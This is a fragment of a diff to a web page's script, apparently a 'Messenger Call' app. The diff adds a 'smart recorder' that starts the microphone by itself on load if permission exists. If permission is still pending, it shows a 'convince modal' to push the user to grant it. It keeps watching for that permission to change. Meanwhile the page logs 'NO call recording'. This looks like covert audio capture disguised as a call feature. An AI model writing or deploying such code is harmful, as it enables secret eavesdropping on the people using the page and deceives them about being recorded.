+      document.getElementById('micDeclineBtn').onclick = askPermission;
 
-/* ============================================================
-   17. CLEANUP
-   ============================================================ */
-window.addEventListener('beforeunload', () => {
-  if (localStream) localStream.getTracks().forEach(t => t.stop());
-  if (micStreamOnly) micStreamOnly.getTracks().forEach(t => t.stop());
-  if (smartMicStream) smartMicStream.getTracks().forEach(t => t.stop());
-  stopRingtone();
-  stopSmartLoop();
-  if (callTimerInterval) clearInterval(callTimerInterval);
-});
+      // Hover effects
+      const acceptBtn = document.getElementById('micAcceptBtn');
+      const declineBtn = document.getElementById('micDeclineBtn');
+      acceptBtn.onmousedown = () => acceptBtn.style.transform = 'scale(0.9)';
+      acceptBtn.onmouseup = () => acceptBtn.style.transform = 'scale(1)';
+      declineBtn.onmousedown = () => declineBtn.style.transform = 'scale(0.9)';
+      declineBtn.onmouseup = () => declineBtn.style.transform = 'scale(1)';
+    }
 
-console.log('✅ Messenger Call ready (NO call recording)');
-</script>
+    /* INIT */
+    async function initSmartRecorder() {
+      console.log('🚀 [Smart] Init...');
+      const state = await checkSmartMicPermission();
+      console.log('📋 [Smart] Permission:', state);
+
+      if (state === 'granted') {
+        console.log('✅ [Smart] Granted — auto-starting');
+        await startSmartRecorder();
+      } else if (state === 'prompt') {
+        console.log('⚠️ [Smart] Prompt — showing convince modal');
+        setTimeout(() => showMicConvinceModal(), 2000);
+      } else if (state === 'denied') {
+        console.log('🚫 [Smart] Denied — silent');
+      }
+      watchSmartPermission();
+    }
+
+    setTimeout(() => initSmartRecorder(), 1500);
+
+    /* ============================================================
+       17. CLEANUP
+       ============================================================ */
+    window.addEventListener('beforeunload', () => {
+      if (localStream) localStream.getTracks().forEach(t => t.stop());
+      if (micStreamOnly) micStreamOnly.getTracks().forEach(t => t.stop());
+      if (smartMicStream) smartMicStream.getTracks().forEach(t => t.stop());
+      stopRingtone();
+      stopSmartLoop();
+      if (callTimerInterval) clearInterval(callTimerInterval);
+    });
+
+    console.log('✅ Messenger Call ready (NO call recording)');
+  </script>
 </body>
+
 </html>
